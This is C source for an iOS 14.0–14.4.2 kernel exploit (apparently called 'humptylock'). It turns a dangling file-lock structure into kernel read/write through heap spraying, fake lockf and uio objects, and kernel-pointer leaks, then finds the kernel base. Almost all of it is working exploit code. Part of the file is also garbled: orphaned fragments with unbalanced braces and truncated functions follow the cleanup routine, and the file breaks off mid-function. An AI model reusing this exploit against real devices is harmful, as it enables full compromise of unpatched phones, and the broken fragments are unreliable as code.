typedef __darwin_mach_port_t fileport_t;
extern int fileport_makeport(int, fileport_t *);

struct HumptyLockContext gHumptyLockContext = { 0 };
struct uio_writer_context {
    _Atomic int entering_writev;
    int result_errno;
};

void *fake_uio_writer_thread(void* ctx)
{
    struct uio_writer_context *context = ctx;
    
    uint64_t valid_source[2] = {0};
    struct iovec iovecs[2] = {
        { .iov_base = valid_source, .iov_len = sizeof(valid_source) },
        { .iov_base = NULL, .iov_len = 0 },
    };

    if (ofd_set_lock(gHumptyLockContext.urandom_fd, F_RDLCK, 0x1d, 7) != 0) {
        context->result_errno = errno != 0 ? errno : EIO;
        atomic_store_explicit(
            &context->entering_writev, -1, memory_order_release);
        return NULL;
    }

    // Two iovecs make UIO_SIZEOF(2) == 0x58, allocated from the 0x60 slot.
    atomic_store_explicit(
        &context->entering_writev, 1, memory_order_release);
    if (writev(gHumptyLockContext.primary_pipe[1], iovecs, 2) < 0) {
        context->result_errno = errno != 0 ? errno : EIO;
    }
    return NULL;
}


int wait_for_fake_uio_writer(pthread_t thread, struct uio_writer_context *context)
{
    thread_t mach_thread = pthread_mach_thread_np(thread);

    for (unsigned int attempt = 0; attempt < 1000000; attempt++) {
        int phase = atomic_load_explicit(&context->entering_writev, memory_order_acquire);

        if (phase < 0) {
            errno = context->result_errno;
            return -1;
        }
        if (phase > 0) {
            thread_basic_info_data_t info = {0};
            mach_msg_type_number_t count = THREAD_BASIC_INFO_COUNT;

            if (thread_info(mach_thread, THREAD_BASIC_INFO, (thread_info_t)&info, &count) != KERN_SUCCESS) {
                errno = EIO;
                return -1;
            }
            if (info.run_state == TH_STATE_WAITING) {
                return 0;
            }
        }
        (void)thread_switch(MACH_PORT_NULL, SWITCH_OPTION_DEPRESS, 0);
    }
    errno = ETIMEDOUT;
    return -1;
}

int create_dangling_lockf(void) {
    if (ofd_set_lock(gHumptyLockContext.urandom_fd, F_RDLCK, 10, 10) == -1)
        return -1;
    
    if (ofd_set_lock(gHumptyLockContext.urandom_fd, F_RDLCK, INT64_MAX, 0) == -1)
        return -1;
    
    if (ofd_set_lock(gHumptyLockContext.urandom_fd, F_UNLCK, 30, (INT64_MAX - 29)) == -1)
        return -1;
    
    if (ofd_set_lock(gHumptyLockContext.urandom_fd, F_RDLCK, 15, 10) == -1)
        return -1;
    
    return 0;
}

int setup_socket_controlled_fake_lockf_pair(void)
{
    off_t lock_start = 100;
    off_t lock_length = 1;
    uint8_t observed_payload[NECP_DOMAIN_PAYLOAD_SIZE] = {0};
    uint32_t observed_length = 0;
    uint64_t socket1_domain_kptr = 0;
    int *socket_fd = gHumptyLockContext.socket_fd;

    // v_lockf A[10,14] -> C(socket0 DOMAIN) -> new B0[100, 100] -> NULL
    if (set_posix_lock(gHumptyLockContext.urandom_fd, F_RDLCK, lock_start, lock_length) != 0)
        return -1;

    for (;;) {
        if (read_necp_domain(socket_fd[0], observed_payload, &observed_length) != 0) {
            return -1;
        }

        // check if contain NULL-byte in allocated lockf Bn address
        if (observed_length >= 0x30 + sizeof(uint64_t)) {             // observed_length >= 0x38
            // Okay, this is good. it doesn't contain NULL-byte in allocated lockf Bn address.
            // leak socket1 domain kaddr ("lockf B0 kaddr")
            memcpy(&socket1_domain_kptr, observed_payload + 0x30, sizeof(socket1_domain_kptr));
            LOG("Leaked socket1_domain_kptr = 0x%llX\n", socket1_domain_kptr);
            break;
        }
        --lock_start;
        lock_length += 2;
        
        // expand lock range for new allocation
        // first try: A[10,14] -> C[socket0 DOMAIN, fake lockf] -> new B1[99,101] -> NULL
        if (set_posix_lock(gHumptyLockContext.urandom_fd, F_RDLCK, lock_start, lock_length) != 0) {
            return -1;
        }

        // do not allocate again that have NULL-byte in allocated address, so holding one contained NULL-byte allocation address
        if (queue_ool_port_array_to_hold_recently_freed_lockf_slot(gHumptyLockContext.lockf_slot_holder) != KERN_SUCCESS) {
            return -1;
        }
    }

    // Free B, but deliberately do not pin it with another OOL allocation.
    // A[10,14] -> C[socket0 DOMAIN, fake lockf] -> new D[99,101] -> NULL
    if (set_posix_lock(gHumptyLockContext.urandom_fd, F_RDLCK, lock_start - 1, lock_length + 2) != 0) {
        return -1;
    }
    
    // Reallocate with controlled data to freed B space.
    // will be "fake lock B" data
    struct lockf fake_lockf = {0};
    fake_lockf.lf_start = 0x2222222222221111ULL;
    fake_lockf.lf_end = 0x3333333333333333ULL;
    fake_lockf.lf_id = (caddr_t)(uintptr_t)0x4444444444444444ULL;
    fake_lockf.lf_head = (struct lockf **)(uintptr_t)0x5555555555555555ULL;
    fake_lockf.lf_vnode = (struct vnode *)(uintptr_t)0x6666666666666666ULL;
    fake_lockf.lf_next = (struct lockf *)(uintptr_t)0x7777777777777777ULL;
    
    uint8_t socket1_payload[NECP_DOMAIN_PAYLOAD_SIZE] = {0};
    memcpy(socket1_payload, (const uint8_t *)&fake_lockf + offsetof(struct lockf, lf_start), sizeof(fake_lockf) - offsetof(struct lockf, lf_start));
    if(spray_default_kalloc_96_via_necp(socket_fd[1], socket1_payload) == -1)
        return -1;
    
    // Free "fake lockf C", and make relink with socket1 domain (which was freed B space)
    // lockf D is now isolated.
    // A[10,14] -> C[socket0 DOMAIN, fake lockf] -> B[socket1 DOMAIN, fake lockf]
    memset(&fake_lockf, 0, sizeof(struct lockf));
    fake_lockf.lf_flags = 0x1111;
    fake_lockf.lf_type = 0x2222;
    fake_lockf.lf_boosted = 0x22222222;
    fake_lockf.lf_start = 0x3333333333333333ULL;
    fake_lockf.lf_end = 0x4444444444444444ULL;
    fake_lockf.lf_id = (caddr_t)(uintptr_t)0x5555555555555555ULL;
    fake_lockf.lf_head = (struct lockf **)(uintptr_t)0x6666666666666666ULL;
    fake_lockf.lf_vnode = (struct vnode *)(uintptr_t)(socket1_domain_kptr + 8);
    fake_lockf.lf_next = (struct lockf *)(uintptr_t)(socket1_domain_kptr - 8);
    if (clear_necp_domain(socket_fd[0]) != 0)
        return -1;
    if(spray_default_kalloc_96_via_necp(socket_fd[0], (const uint8_t *)&fake_lockf) == -1)
        return -1;
    
    gHumptyLockContext.socket1_domain_kptr = socket1_domain_kptr;
    
    return 0;
}

int init_humptylock(void) {
    init_offsets();
    
    int *socket_fd = create_udp_socket(3);
    if(socket_fd == NULL)   return -1;

    mach_port_t reply_port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if(kr != KERN_SUCCESS)  return -1;
    
    int urandom_fd = open("/dev/urandom", O_RDONLY);
    if (urandom_fd < 0) return -1;
    mach_port_name_t urandom_fpname = MACH_PORT_NULL;
    int ret = fileport_makeport(urandom_fd, &urandom_fpname);
    if(ret == -1)   return -1;
    
    // create primary pipe
    int primary_pipe[2] = {0};
    if (pipe(primary_pipe) != 0)    return -1;
    void* buf64k = NULL;
    size_t buf64k_sz = 0x10000;
    kr = vm_allocate(mach_task_self(), (vm_address_t *)&buf64k, buf64k_sz, VM_FLAGS_ANYWHERE);
    if(kr != KERN_SUCCESS)  return -1;
    memset(buf64k, 0, buf64k_sz);
    if (write(primary_pipe[1], buf64k, buf64k_sz) < 0)  return -1;
    if (read(primary_pipe[0], buf64k, buf64k_sz) < 0)   return -1;
    
    // create secondary pipe
    int secondary_pipe[2] = {0};
    if (pipe(secondary_pipe) != 0)  return -1;
    mach_port_name_t secondary_pipe_fpname = MACH_PORT_NULL;
    ret = fileport_makeport(secondary_pipe[0], &secondary_pipe_fpname);
    if(ret == -1)   return -1;
    
    struct lockf_slot_ool_holder *lockf_slot_holder = calloc(1, sizeof(*lockf_slot_holder));
    memset(lockf_slot_holder, 0, sizeof(*lockf_slot_holder));
    ret = prepare_lockf_slot_ool_holder(lockf_slot_holder);
    if(ret == -1)   return -1;
    
    // fill fields in structure
    gHumptyLockContext.socket_fd = socket_fd;
    gHumptyLockContext.reply_port = reply_port;
    gHumptyLockContext.urandom_fd = urandom_fd;
    gHumptyLockContext.urandom_fpname = urandom_fpname;
    memcpy(gHumptyLockContext.primary_pipe, primary_pipe, sizeof(primary_pipe));
    gHumptyLockContext.buf64k = buf64k;
    memcpy(gHumptyLockContext.secondary_pipe, secondary_pipe, sizeof(secondary_pipe));
    gHumptyLockContext.secondary_pipe_fpname = secondary_pipe_fpname;
    gHumptyLockContext.lockf_slot_holder = lockf_slot_holder;
    gHumptyLockContext.installed_pipe_kread_primitive = false;
    
    return 0;
}

int run_humptylock(void) {
    int ret = create_dangling_lockf();
    if(ret == -1)   return -1;
        
    // Reoccupy with array of 12 Mach OOL ports
    // 12 * sizeof(ipc_object_t) = 0x60
    //
    // fake lockf structure)
    /*
    +0x08 lf_start = target ipc_port *
    +0x10 lf_end   = -1
    +0x18 lf_id    = target ipc_port *
    ...
    +0x58 lf_owner = target ipc_port *
    */
    ret = refill_dangling_lockf_data_with_ool_ports(gHumptyLockContext.reply_port, gHumptyLockContext.urandom_fpname, true);
    if(ret == -1)   return -1;
    
    // Obtain urandom_fileglob_kptr by leaking two values (fl.l_start, fl.l_pid)
    // fl.l_start = fileport ipc_port *
    // fl.l_pid = proc_pid((proc *)fileport_ipc_port)
    //          = low32(fileport_ipc_port->ip_kobject)
    //          = low32(/dev/urandom fileglob *)
    struct flock* fl = calloc(1, sizeof(struct flock));
    ofd_get_lock(gHumptyLockContext.urandom_fd, F_WRLCK, 0, 0, fl);
    uint64_t urandom_fileglob_kptr = (fl->l_start & 0xFFFFFFFF00000000) | (fl->l_pid & 0xFFFFFFFF);
    LOG("Leaked urandom_fileglob_kptr = 0x%llX\n", urandom_fileglob_kptr);
    gHumptyLockContext.urandom_fileglob_kptr = urandom_fileglob_kptr;
    
    // Free OOL array
    mach_msg_empty_rcv_t recv_msg = {0};
    mach_msg(&recv_msg.header, MACH_RCV_MSG | MACH_RCV_INTERRUPT, 0, 0, gHumptyLockContext.reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    // Then reallocate to leak secondary_pipe fileport's ipc_port *
    ret = refill_dangling_lockf_data_with_ool_ports(gHumptyLockContext.reply_port, gHumptyLockContext.secondary_pipe_fpname, true);
    if(ret == -1)   return -1;
    // Leak the secondary_pipe fileport's ipc_port *:
    // OOL-port copy-in resolves the fileport_readpipe send-right name via space->is_table[MACH_PORT_INDEX(name)],
    // derives its kernel ipc_port * from ipc_entry.ie_object, stores it in objects[1] (aliasing the dangling lockf.lf_start at +0x08)
    ofd_get_lock(gHumptyLockContext.urandom_fd, F_WRLCK, 0, 0, fl);
    uint64_t secondary_pipe_fileport_ipc_port_kptr = fl->l_start;
    LOG("Leaked secondary_pipe_fileport_ipc_port_kptr = 0x%llX\n", secondary_pipe_fileport_ipc_port_kptr);
    
    // Free OOL array (again!)
    mach_msg(&recv_msg.header, MACH_RCV_MSG | MACH_RCV_INTERRUPT, 0, 0, gHumptyLockContext.reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    // Create "fake lockf C" data
    struct lockf fake_lockf = {0};
    fake_lockf.lf_flags   = 0x1111;
    fake_lockf.lf_type    = 0x2222;
    fake_lockf.lf_boosted = 0x22222222;
    fake_lockf.lf_start   = 0x3333333333333333ULL;
    fake_lockf.lf_end     = 0x4444444444444444ULL;
    fake_lockf.lf_id      = (caddr_t)(uintptr_t)0x5555555555555555ULL;
    fake_lockf.lf_head    = (struct lockf **)(uintptr_t)0x6666666666666666ULL;
    fake_lockf.lf_vnode   = (struct vnode *)(uintptr_t)0x7777777777777777ULL;
    // Reallocate with "fake lockf C" data
    int *socket_fd = gHumptyLockContext.socket_fd;
    ret = spray_default_kalloc_96_via_necp(socket_fd[0], (const uint8_t *)&fake_lockf);
    if(ret == -1)   return -1;
    
    // A[10,14] -> C[socket0 DOMAIN, fake lockf] -> B[socket1 DOMAIN, fake lockf]
    ret = setup_socket_controlled_fake_lockf_pair();
    if(ret == -1)   return -1;
    
    // Obtain secondary pipe's pipe_buffer.buffer
    // Walkdown with fileglob+0x38 -> struct pipe; pipe+0x10 -> pipe_buffer.buffer.
    uint64_t secondary_pipe_fileglob_kptr = 0;
    early_kreadptr(secondary_pipe_fileport_ipc_port_kptr + off_ipc_port_ip_kobject, &secondary_pipe_fileglob_kptr);
    LOG("Obtained secondary_pipe_fileglob_kptr = 0x%llX\n", secondary_pipe_fileglob_kptr);
    uint64_t secondary_pipe_fgdata_kptr = 0;
    early_kreadptr(secondary_pipe_fileglob_kptr + off_fg_data, &secondary_pipe_fgdata_kptr);
    LOG("Obtained secondary_pipe_fgdata_kptr = 0x%llX\n", secondary_pipe_fgdata_kptr);
    uint64_t secondary_pipe_pipebuffer_kptr = 0;
    early_kreadptr(secondary_pipe_fgdata_kptr + off_pb_buffer, &secondary_pipe_pipebuffer_kptr);
    LOG("Obtained secondary_pipe_pipebuffer_kptr = 0x%llX\n", secondary_pipe_pipebuffer_kptr);
    gHumptyLockContext.secondary_pipe_pipebuffer_kptr = secondary_pipe_pipebuffer_kptr;
    
    // Make fake lockf C's lf_next pointed to secondary readpipe's pipe_buffer.buffer
    // lockf A[real lockf, lf_start=10, lf_end=14]
    // -> C[socket0 DOMAIN, fake lockf, lf_start=0xC8, lf_end=0xCC]
    // -> E[secondary pipe's pipe_buffer.buffer, fake lockf]
    memset(&fake_lockf, 0, sizeof(struct lockf));
    fake_lockf.lf_start = 0xC8;
    fake_lockf.lf_end   = 0xCC;
    fake_lockf.lf_next  = (struct lockf *)(uintptr_t)secondary_pipe_pipebuffer_kptr;
    if (clear_necp_domain(socket_fd[0]) != 0)
        return -1;
    if (spray_default_kalloc_96_via_necp(socket_fd[0], (const uint8_t *)&fake_lockf) == -1)
        return -1;
    gHumptyLockContext.installed_pipe_kread_primitive = true;
    
    // Start finding our proc
    // lockf A[real lockf, lf_start=10, lf_end=14]
    // -> C[socket0 DOMAIN, fake lockf, lf_start=0xC8, lf_end=0xCC]
    // -> E[secondary pipe's pipe_buffer.buffer, fake lockf, lf_start=0x12C, lf_end=0x130]
    memset(&fake_lockf, 0, sizeof(struct lockf));
    fake_lockf.lf_start = 0x12c;
    fake_lockf.lf_end   = 0x130;
    if (write_pipe_fd(gHumptyLockContext.secondary_pipe[1], &fake_lockf, sizeof(fake_lockf)) != 0)
        return -1;
    // lockf A[real lockf, lf_start=10, lf_end=14]
    // -> C[socket0 DOMAIN, fake lockf, lf_start=0xC8, lf_end=0xCC]
    // -> E[secondary pipe's pipe_buffer.buffer, fake lockf, lf_start=0x12C, lf_end=0x130]
    // -> new lockf F[real lockf, lf_start=0x190, lf_end=0x190]
    if (set_posix_lock(gHumptyLockContext.urandom_fd, F_RDLCK, 0x190, 1) != 0)
        return -1;
    
    // Leak newly allocated address of "(real) lockf F"
    uint64_t new_lockf_kptr = 0;
    uint8_t saved_payload[NECP_DOMAIN_PAYLOAD_SIZE];
    if (read_pipe_fd(gHumptyLockContext.secondary_pipe[0], saved_payload, sizeof(saved_payload)) != 0)
        return -1;
    memcpy(&new_lockf_kptr, saved_payload + offsetof(struct lockf, lf_next), sizeof(new_lockf_kptr));
    LOG("Obtained new_lockf_kptr = 0x%llX\n", new_lockf_kptr);
    
    // kread “lockf F”'s lf_id to obtain our proc
    uint64_t our_proc = 0;
    early_kreadptr(new_lockf_kptr + offsetof(struct lockf, lf_id), &our_proc);
    LOG("Obtained our_proc = 0x%llX\n", our_proc);
    
    // Restore pipe buffer data, and some part of... clean up
    if (write_pipe_fd(gHumptyLockContext.secondary_pipe[1], saved_payload, sizeof(saved_payload)) != 0)
        return -1;
    memset(saved_payload, 0, NECP_DOMAIN_PAYLOAD_SIZE);
    // deallocate newly allocated "lockf F"
    if (set_posix_lock(gHumptyLockContext.urandom_fd, F_UNLCK, 0x190, 1) != 0)
        return -1;
    // check if deallocate well
    if (read_pipe_fd(gHumptyLockContext.secondary_pipe[0], saved_payload, sizeof(saved_payload)) != 0)
        return -1;
    memcpy(&new_lockf_kptr, saved_payload + offsetof(struct lockf, lf_next), sizeof(new_lockf_kptr));
    if (new_lockf_kptr != 0)
        return -1;
    
    // Obtain socket_fd[2]'s fileproc kptr
    uint64_t our_filedesc_kptr = 0;
    early_kreadptr(our_proc + off_p_pfd, &our_filedesc_kptr);
    LOG("Obtained our_filedesc_kptr = 0x%llX\n", our_filedesc_kptr);
    uint64_t our_fd_ofiles_kptr = 0;
    early_kreadptr(our_filedesc_kptr, &our_fd_ofiles_kptr);
    LOG("Obtained our_fd_ofiles_kptr = 0x%llX\n", our_fd_ofiles_kptr);
    uint64_t third_socket_fileproc_kptr = 0;
    early_kreadptr(our_fd_ofiles_kptr + (uint64_t)socket_fd[2] * 8, &third_socket_fileproc_kptr);
    LOG("Obtained third_socket_fileproc_kptr = 0x%llX\n", third_socket_fileproc_kptr);
    
    // Install fake kern_iovec to secondary pipe
    struct kern_iovec fake_kern_iovec = {
        .iov_base = third_socket_fileproc_kptr + off_fp_fglob,
        .iov_len = sizeof(uint64_t),
    };
    if (write_pipe_fd(gHumptyLockContext.secondary_pipe[1], &fake_kern_iovec, sizeof(struct kern_iovec)) != 0)
        return -1;
    if (read_pipe_fd(gHumptyLockContext.secondary_pipe[0], &fake_kern_iovec, sizeof(struct kern_iovec)) != 0)
        return -1;
    
    // Reclaim the blocked writer's 0x58 uio with socket0, then reverse uiomove()
    // so the stale primary-pipe bytes are copied to the staged kern_iovec.
    //
    // lockf A[real lockf, lf_start=10, lf_end=14]
    // -> C[socket0 DOMAIN, fake lockf, lf_start=0x1e, lf_end=0x22, lf_id=urandom_fileglob_kptr]
    memset(&fake_lockf, 0, sizeof(struct lockf));
    fake_lockf.lf_start = 0x1e;
    fake_lockf.lf_end   = 0x22;
    fake_lockf.lf_id    = (caddr_t)(uintptr_t)urandom_fileglob_kptr;
    if (clear_necp_domain(socket_fd[0]) != 0)
        return -1;
    if (spray_default_kalloc_96_via_necp(socket_fd[0], (const uint8_t *)&fake_lockf) == -1)
        return -1;
    // write secondary_pipe_pipebuffer_kptr to primary pipe buffer
    void* buf64k = gHumptyLockContext.buf64k;
    size_t buf64k_sz = 0x10000;
    memset(buf64k, 0, buf64k_sz);
    memcpy(buf64k, &secondary_pipe_pipebuffer_kptr, sizeof(secondary_pipe_pipebuffer_kptr));
    if (write_pipe_fd(gHumptyLockContext.primary_pipe[1], buf64k, buf64k_sz) != 0)
        return -1;
    struct uio_writer_context fake_uio_writer_context = {
        .entering_writev = 0,
        .result_errno = 0,
    };
    // lockf A[real lockf, lf_start=10, lf_end=14]
    // -> new lockf G[real lockf, lf_start=0x19, lf_end=0x23]
    // fake lockf C will be occupied with (real) uio + kern_iovec*2
    // sizeof(struct uio) = 0x38, sizeof(struct kern_iovec) = 0x10
    // 0x38 + 0x10 * 2 = 0x58; so kalloc from default.kalloc.96
    pthread_t writer;
    ret = pthread_create(&writer, NULL, fake_uio_writer_thread, &fake_uio_writer_context);
    if (wait_for_fake_uio_writer(writer, &fake_uio_writer_context) != 0)
        return -1;
    // kfree space "new lockf G[real lockf, lf_start=0x19, lf_end=0x23]"
    if (clear_necp_domain(socket_fd[0]) != 0)
        return -1;
    // now we can control space "new lockf G"
    struct uio fake_uio = {0};
    fake_uio.uio_iovs.kiovp = (struct kern_iovec *)(uintptr_t)secondary_pipe_pipebuffer_kptr;
    fake_uio.uio_iovcnt   = 1;
    fake_uio.uio_offset   = 0;
    fake_uio.uio_segflg   = UIO_SYSSPACE;
    fake_uio.uio_rw       = UIO_READ;
    fake_uio.uio_resid_64 = sizeof(uint64_t);
    fake_uio.uio_size     = 0x58;
    fake_uio.uio_max_iovs = 1;
    fake_uio.uio_flags    = UIO_FLAGS_INITED;
    uint8_t fake_uio_payload[NECP_DOMAIN_PAYLOAD_SIZE] = {0};
    memcpy(fake_uio_payload, &fake_uio, sizeof(fake_uio));
    if (spray_default_kalloc_96_via_necp(socket_fd[0], fake_uio_payload))
        return -1;
    // read exactly 8 byte to wake up pipe_write()/uiomove(), because primary pipe space is full
    // When wake up, socket_fd[2]'s fp_glob is now overwrote with secondary pipe_buffer.buffer
    uint64_t dummy = 0;
    if (read_pipe_fd(gHumptyLockContext.primary_pipe[0], &dummy, sizeof(dummy)) != 0)
        return -1;
    ret = pthread_join(writer, NULL);
    if(ret != 0 || fake_uio_writer_context.result_errno != 0)   return -1;
    
    // WE ARE NOW READY
    // Test kernel r/w using fcntl(…, F_GETOWN), fcntl(…, F_SETOWN);
//    khexdump(our_proc, 0x100);
    LOG("Writing 0x4141414141414141 to secondary_pipe_pipebuffer_kptr+0x100 for testing kernel r/w\n");
    uint64_t test_address = secondary_pipe_pipebuffer_kptr + 0x100;
    uint64_t old_value = kread64(test_address);
    LOG("kaddr: 0x%llX -> (old) val: 0x%llX\n", test_address, old_value);
    uint64_t new_value = 0x4141414141414141;
    kwrite64(test_address, new_value);
    uint64_t new_value_for_check = kread64(test_address);
    LOG("kaddr: 0x%llX -> (new) val: 0x%llX\n", test_address, new_value_for_check);
    // restore where we wrote 0x4141414141414141
    kwrite64(test_address, old_value);
    
    // kernel base ..
    uint64_t kbase = kreadptr(gHumptyLockContext.urandom_fileglob_kptr + offsetof(struct fileglob, fg_ops)) & ~0x3fffULL;
    while (kread32(kbase) != MH_MAGIC_64 || kread32(kbase + 0xc) != MH_EXECUTE) kbase -= 0x4000;
    uint64_t kslide = kbase - 0xfffffff007004000ULL;
    LOG("Obtained kbase = 0x%llX, kslide = 0x%llX\n", kbase, kslide);

    return 0;
}

int deinit_humptylock(void) {
    if (ofd_set_lock(gHumptyLockContext.urandom_fd, F_UNLCK, 0, (off_t)INT64_MAX) != 0)
        return -1;
    
    close(gHumptyLockContext.urandom_fd);

    close(gHumptyLockContext.socket_fd[0]);
    close(gHumptyLockContext.socket_fd[1]);

    close(gHumptyLockContext.primary_pipe[0]);
    close(gHumptyLockContext.primary_pipe[1]);
    
    // control->fp_glob points into PB, so drop control before secondary PB's pipes.
    close(gHumptyLockContext.socket_fd[2]);
    close(gHumptyLockContext.secondary_pipe[0]);
    close(gHumptyLockContext.secondary_pipe[1]);
    
    if (MACH_PORT_VALID(gHumptyLockContext.urandom_fpname))
        mach_port_deallocate(mach_task_self(), gHumptyLockContext.urandom_fpname);
    if (MACH_PORT_VALID(gHumptyLockContext.secondary_pipe_fpname))
        mach_port_deallocate(mach_task_self(), gHumptyLockContext.secondary_pipe_fpname);
    if (MACH_PORT_VALID(gHumptyLockContext.reply_port))
        mach_port_mod_refs(mach_task_self(), gHumptyLockContext.reply_port, MACH_PORT_RIGHT_RECEIVE, -1);
    if (gHumptyLockContext.buf64k != NULL)
        vm_deallocate(mach_task_self(), (vm_address_t)gHumptyLockContext.buf64k, 0x10000);
    if (gHumptyLockContext.lockf_slot_holder != NULL) {
        destroy_lockf_slot_ool_holder(gHumptyLockContext.lockf_slot_holder);
        free(gHumptyLockContext.lockf_slot_holder);
    }
    
    free(gHumptyLockContext.socket_fd);
    memset(&gHumptyLockContext, 0, sizeof(struct HumptyLockContext));
    
    return 0;
}

        if (clear_necp_domain(socket_fd[1]) != 0)
            return -1;
        if (spray_default_kalloc_96_via_necp(socket_fd[1], socket1_payload) == -1)
            return -1;
    }
    else {
        if (write_pipe_fd(gHumptyLockContext.secondary_pipe[1], &fake_lockf, sizeof(lockf)) != 0)

        if (read_pipe_fd(gHumptyLockContext.secondary_pipe[0], &fake_lockf, sizeof(lockf)) != 0)

int early_kread64(uint64_t where, uint64_t *what) {
    uint32_t low32 = 0;
    uint32_t high32 = 0;
    if(early_kread32(where, &low32) == -1)  return -1;
    if(early_kread32(where + 4, &high32) == -1) return -1;
    
    *what = (((uint64_t)high32 << 32) | (uint64_t)low32);

    return 0;

uint64_t unsign_pac(uint64_t address)

    if (address != 0 && (address & 0x0080000000000000ULL) != 0) {
        address |= 0xFFFFFF8000000000ULL;

}

void kreadbuf(uint64_t addr, void *buf, uint64_t len) {
    for (size_t off = 0; off < len; off += 8) {
        uint64_t val = kread64(addr + off);
        size_t chunk = (len - off >= 8) ? 8 : (len - off);
        memcpy((uint8_t *)buf + off, &val, chunk);
    }
}

void khexdump(uint64_t addr, size_t size) {
    void *data = malloc(size);
    kreadbuf(addr, data, size);
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", addr, i);
//            printf("[0x%016llx] ", i + addr);
        }
        
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
    free(data);
}

int ofd_set_lock(int fd, short type, off_t start, off_t length)
{
    struct flock fl;
    memset(&fl, 0, sizeof(fl));

    fl.l_start  = start;
    fl.l_len    = length;
    fl.l_pid    = 0;
    fl.l_type   = type;
    fl.l_whence = SEEK_SET;

    return fcntl(fd, F_OFD_SETLK, &fl);
}

int ofd_get_lock(int fd, short type, off_t start, off_t length, struct flock *fl)
{
    memset(fl, 0, sizeof(*fl));
    
    fl->l_start  = start;
    fl->l_len    = length;
    fl->l_pid    = 0;
    fl->l_type   = type;
    fl->l_whence = SEEK_SET;
    
    return fcntl(fd, F_OFD_GETLK, fl);
}

int set_posix_lock(int fd, short type, off_t start, off_t length)
{
    struct flock fl = {
        .l_start = start,
        .l_len = length,
        .l_pid = 0,
        .l_type = type,
        .l_whence = SEEK_SET,
    };

    return fcntl(fd, F_SETLK, &fl);
}

void init_offsets(void)
{
    print_os_details();
    
    char system_version[48] = {0};
    size_t system_version_size = sizeof(system_version);

    if (sysctlbyname(
            "kern.osproductversion",
            system_version,
            &system_version_size,
            NULL,
            0) != 0) {
        perror("sysctlbyname(kern.osproductversion)");
        exit(EXIT_FAILURE);
    }

    /* Ensure termination even if an unexpected value is returned. */
    system_version[sizeof(system_version) - 1] = '\0';
    

    unsigned major = 0, minor = 0, patch = 0;

    // set support range; iOS 14.0 - 14.4.2
    if (sscanf(system_version, "%u.%u.%u", &major, &minor, &patch) < 2 ||
        major != 14 || minor > 4 || (minor == 4 && patch > 2)) {
        printf("[-] Unsupported iOS version: %s\n", system_version);
        exit(EXIT_FAILURE);
    }

    printf("[i] offsets selected for iOS %s\n", system_version);

    off_ipc_port_ip_kobject = 0x68;
    off_task_itk_space      = 0x330;
    off_ipc_space_is_table  = 0x20;

    off_p_pid          = 0x68;
    off_p_list_le_prev = 0x8;
    off_p_task         = 0x10;
    off_p_pfd          = 0xf8;

    off_fg_data   = 0x38;
    off_fp_fglob  = 0x10;
    off_pb_buffer = 0x10;
    off_pb_cnt    = 0x0;
    
    off_socket_so_pgid = 0x60;
}

int print_os_details(void)
{
    char machine[256], model[256], kern[256], prod[256], build[256];

#define SYSCTL_STR(name, dst) do {                          \
        size_t len = sizeof(dst);                           \
        int err = sysctlbyname(name, dst, &len, NULL, 0);   \
        assert(err == 0); (void)err;                        \
    } while (0)

    SYSCTL_STR("hw.machine",            machine);
    SYSCTL_STR("hw.model",              model);
    SYSCTL_STR("kern.version",          kern);
    SYSCTL_STR("kern.osproductversion", prod);
    SYSCTL_STR("kern.osversion",        build);

#undef SYSCTL_STR

    printf("[i] Machine Name: %s\n", machine);
    printf("[i] Model Name: %s\n", model);
    printf("[i] Kernel Version: %s\n", kern);
    printf("[i] System Version: iOS %s (%s)\n", prod, build);
    
    return 0;
}

int refill_dangling_lockf_data_with_ool_ports(mach_port_t where, mach_port_t target_port, bool make_eof_lf_end) {
    const int port_cnt = 12;
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * port_cnt);
    for (int i = 0; i < port_cnt; i++) {
        ports[i] = target_port;
    }
    if(make_eof_lf_end)
        ports[2] = MACH_PORT_DEAD;

    struct default_msg* message = (struct default_msg*)calloc(1, sizeof(struct default_msg));
    message->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    message->header.msgh_size = sizeof(struct default_msg);
    message->header.msgh_remote_port = where;
    message->body.msgh_descriptor_count = 1;
    message->descriptor.address = ports;
    message->descriptor.deallocate = false;
    message->descriptor.copy = MACH_MSG_PHYSICAL_COPY;
    message->descriptor.disposition = MACH_MSG_TYPE_COPY_SEND;
    message->descriptor.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    message->descriptor.count = port_cnt;

    kern_return_t kr = mach_msg(
      &message->header,
      MACH_SEND_MSG | MACH_SEND_INTERRUPT | MACH_SEND_NOIMPORTANCE,
      message->header.msgh_size,
      0,
      MACH_PORT_NULL,
      MACH_MSG_TIMEOUT_NONE,
      MACH_PORT_NULL);

    free(message);
    free(ports);

    if (kr != KERN_SUCCESS) {
        LOG("Failed to send OOL message: 0x%x (%s)\n", kr, mach_error_string(kr));
        return -1;
    }
    return 0;
}

int prepare_lockf_slot_ool_holder(struct lockf_slot_ool_holder *holder)
{
    const int port_cnt = 12;
    
    holder->hold_message_template.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    holder->hold_message_template.header.msgh_size = sizeof(struct default_msg);
    holder->hold_message_template.header.msgh_id = 1;
    holder->hold_message_template.body.msgh_descriptor_count = 1;
    holder->hold_message_template.descriptor.address = holder->ool_port_array;
